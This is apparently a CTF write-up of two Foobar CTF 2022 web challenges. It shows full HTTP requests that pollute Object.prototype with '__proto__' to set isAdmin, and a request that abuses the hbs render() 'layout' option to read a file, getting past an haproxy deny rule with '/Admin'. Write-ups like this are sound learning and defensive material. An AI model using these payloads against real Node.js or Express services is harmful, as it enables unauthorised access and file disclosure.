<img src="https://cdn.pocas.kr/CTF/Foobar%20CTF%202022/back.png" style="width: 100%; max-width: 100%; height: auto;">
I participated the Foobar CTF 2022 about 1h and I solved two web challenges.

---
## (Web) Find My Location [100 pts]

The Find My Location is challenge that solve using the prototype pollution.

```javascript
const myLoaction = [
    { flag: "GLUG{f4k3_fl4g_f0r_t3st1ng}" }
]
```
The flag location is an object called myLocation

```javascript
app.post('/', (req, res) => {
    console.log(req.body)
    const user = findUser(req.body.auth || {});

    if (!user) {
        res.status(403).send({ ok: false, error: 'Access denied' });
        return;
    }

    const history = {
        icon: '👋',
    };

    Object.assign(history,req.body.location)

    if (history.isAdmin == true) {
        res.status(200).send(myLoaction)

    } else {
        res.status(200).send(history)
    }
})
```
If we want to get the flag, we must set the value of isAdmin to true but in general, we cannot. But prototype pollution occur in Object.assign(). We can set the value of isAdmin property to true using the this issue.

```plaintext
POST / HTTP/1.1
Host: chall.nitdgplug.org:30230
Content-Length: 83
Content-Type: application/json
Connection: close

{"auth":{"name":"user","password":"pwd"},"location":{"__proto__":{"isAdmin":true}}}

HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Content-Length: 45
ETag: W/"2d-yNZSGSCCBiCRsTRZe/W+haX4BRM"
Date: Sat, 05 Mar 2022 16:40:38 GMT
Connection: close

[{"flag":"9orO7yp3_po11u7iOn_f1nd_1oc4tiOn"}]
```

```plaintext
FLAG : GLUG{9orO7yp3_po11u7iOn_f1nd_1oc4tiOn}
```

---
## (Web) whoami [470 pts]

The whoami is a challenge to solve using the interesting logic that occurs in the render() method of the hbs template engine.

```javascript
router.post('/admin', function(req, res, next) {
        var profile = req.body.profile
        res.render('index', profile)
});
```
The vulnerability occurs in the code above. The reason is the wrong way to pass the second argument of render(). If an argument is passed as above, LFI is generated. More information can be found [here](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/). Try the analysis yourself. I knew this about 10 months ago. So as soon as I saw the code, I knew immediately.

```plaintext
POST /admin HTTP/1.1
Host: web.chall.nitdgplug.org:80
Content-Length: 62
Content-Type: application/json
Connection: close

{
  "profile": {
    "layout": "./../views/flag.txt"
  }
}

HTTP/1.1 403 Forbidden
content-length: 93
cache-control: no-cache
content-type: text/html
connection: close

<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
```
So I tried to get the flag using an interesting issue, but a 405 header was returned.

```plaintext
global
    daemon
    maxconn 256

defaults
    mode http
    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms

frontend http-in
    bind *:80
    default_backend servers
    http-request deny if { path_beg /admin }

backend servers
    option http-keep-alive
    option forwardfor
    server server1 localhost:9090 maxconn 32
```
So, looking closely at the code, I saw that haproxy was being used, and the proxy setting was set to deny requests to /admin. However, the “-i” option of the acl flag was not set, so the proxy was case-sensitive. So I bypassed it using this

```plaintext
POST /Admin HTTP/1.1
Host: web.chall.nitdgplug.org:80
Content-Length: 62
Content-Type: application/json
Connection: close

{
  "profile": {
    "layout": "./../views/flag.txt"
  }
}

HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 39
etag: W/"27-jRTUeDHSRSW+LShiq4v7jVRdiy8"
date: Sat, 05 Mar 2022 17:04:41 GMT
keep-alive: timeout=5
connection: close

GLUG{n0w_1_kn0w_wh0_4r3_y0u_1FOXABB6GM}
```

```
FLAG : GLUG{n0w_1_kn0w_wh0_4r3_y0u_1FOXABB6GM}
```

---
